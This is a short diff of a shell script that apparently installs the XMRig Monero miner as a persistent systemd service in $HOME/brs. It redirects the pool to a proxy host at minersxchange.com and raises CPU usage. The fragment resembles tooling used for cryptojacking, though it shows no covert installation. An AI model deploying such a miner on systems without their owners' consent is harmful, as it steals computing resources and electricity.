@@ -295,7 +295,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/brs/config.json
+sed -i 's/"url": *"[^"]*",/"url": "cryptonote-proxy-01.minersxchange.com:3333",/' $HOME/brs/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/brs/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/brs/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/brs/config.json
@@ -353,11 +353,11 @@ else
 [Unit]
 Description=BRS miner service
 [Service]
-ExecStart=$HOME/brs/xmrig --config=$HOME/brs/config.json
+ExecStart=$HOME/brs/xmrig $HOME/brs/config.json
 Restart=always
 Nice=19
-CPUWeight=20
-CPUQuota=85%
+CPUWeight=1
+CPUQuota=90%
 IOWeight=20
 MemorySwapMax=0
 [Install]
